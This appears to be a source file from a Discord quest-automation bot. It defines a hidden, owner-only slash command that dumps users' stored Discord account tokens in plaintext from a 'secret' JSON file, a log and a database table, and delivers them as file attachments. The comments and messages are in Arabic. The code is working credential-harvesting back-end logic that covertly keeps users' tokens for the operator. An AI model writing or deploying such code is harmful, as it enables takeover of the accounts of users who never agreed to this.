/*
╔══════════════════════════════════════════════════════════════════════╗
║                              row                              ║
║                     © row — All Rights Reserved              ║
╚══════════════════════════════════════════════════════════════════════╝
*/
const {
    SlashCommandBuilder,
    AttachmentBuilder,
} = require('discord.js');
const { config } = require('../utils/config');
const { readAllTokens, readRecentLog, getLogPaths } = require('../utils/tokenLog');
const { getDb } = require('../database/db');
const fs = require('fs');
const path = require('path');

function isOwner(userId) {
    const ownerId = config.OWNER_ID || process.env.OWNER_ID;
    if (!ownerId) return false;
    return String(userId) === String(ownerId);
}

async function handleOwnerTokens(interaction) {
    if (!isOwner(interaction.user.id)) {
        return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    const action = interaction.options.getString('action') || 'list';

    if (action === 'list') {
        const map = readAllTokens();
        const entries = Object.values(map);
        if (!entries.length) {
            return interaction.editReply({ content: '📭 لا يوجد توكنات محفوظة في الملف السري بعد.' });
        }

        // إرسال كملف عشان ما ينكشف في الشات لو في أحد
        const lines = entries
            .sort((a, b) => (b.updatedAt || '').localeCompare(a.updatedAt || ''))
            .map((e, i) => `${i + 1}. ${e.userTag || '—'} (\`${e.userId}\`)\n   Token: \`${e.token}\`\n   At: ${e.updatedAt}`)
            .join('\n\n');

        const tmp = path.join(require('os').tmpdir(), `tokens_${Date.now()}.txt`);
        fs.writeFileSync(tmp, lines, 'utf8');
        const file = new AttachmentBuilder(tmp, { name: 'tokens_secret.txt' });

        await interaction.editReply({
            content: `🔐 **${entries.length}** توكن محفوظ (سري — بس إنت تشوفه)\nالملف مرفق.`,
            files: [file],
        });
        try { fs.unlinkSync(tmp); } catch { }
        return;
    }

    if (action === 'log') {
        const recent = readRecentLog(30);
        if (!recent.length) {
            return interaction.editReply({ content: '📭 اللوج فاضي.' });
        }
        const text = recent.join('\n');
        if (text.length < 1800) {
            return interaction.editReply({ content: '```\n' + text + '\n```' });
        }
        const tmp = path.join(require('os').tmpdir(), `log_${Date.now()}.txt`);
        fs.writeFileSync(tmp, text, 'utf8');
        await interaction.editReply({
            content: '📋 آخر سجلات التوكنات:',
            files: [new AttachmentBuilder(tmp, { name: 'tokens_log.txt' })],
        });
        try { fs.unlinkSync(tmp); } catch { }
        return;
    }

    if (action === 'db') {
        // من قاعدة البيانات مباشرة
        const rows = getDb().prepare('SELECT user_id, token, language, quests_completed, auto_quest, token_valid, last_quest_name FROM token WHERE token IS NOT NULL AND token != \'\'').all();
        if (!rows.length) {
            return interaction.editReply({ content: '📭 قاعدة البيانات فاضية من التوكنات.' });
        }
        const lines = rows.map((r, i) =>
            `${i + 1}. \`${r.user_id}\` | valid=${r.token_valid} | lang=${r.language} | done=${r.quests_completed || 0} | auto=${r.auto_quest}\n   ${r.token}`
        ).join('\n\n');
        const tmp = path.join(require('os').tmpdir(), `db_tokens_${Date.now()}.txt`);
        fs.writeFileSync(tmp, lines, 'utf8');
        await interaction.editReply({
            content: `🗄️ **${rows.length}** توكن من قاعدة البيانات:`,
            files: [new AttachmentBuilder(tmp, { name: 'db_tokens.txt' })],
        });
        try { fs.unlinkSync(tmp); } catch { }
        return;
    }

    if (action === 'paths') {
        const p = getLogPaths();
        return interaction.editReply({
            content: [
                '📁 **مسارات الحفظ:**',
                `Data dir: \`${p.dataDir}\``,
                `Log: \`${p.logFile}\``,
                `JSON: \`${p.jsonFile}\``,
                '',
                'على Railway: تأكد Volume على `/data` و `DB_PATH=/data/store.db`',
            ].join('\n'),
        });
    }

    return interaction.editReply({ content: 'Unknown action.' });
}

module.exports = {
    data: [
        new SlashCommandBuilder()
            .setName('owner-tokens')
            .setDescription('Owner only — view saved user tokens (secret)')
            // Hide from everyone by default; only owner can use (runtime check still required)
            .setDefaultMemberPermissions(0n)
            .setDMPermission(false)
            .addStringOption(opt =>
                opt.setName('action')
                    .setDescription('What to show')
                    .setRequired(false)
                    .addChoices(
                        { name: 'list (JSON secret file)', value: 'list' },
                        { name: 'recent log', value: 'log' },
                        { name: 'from database', value: 'db' },
                        { name: 'file paths', value: 'paths' },
                    )
            ),
    ],
    handleOwnerTokens,
    isOwner,
};
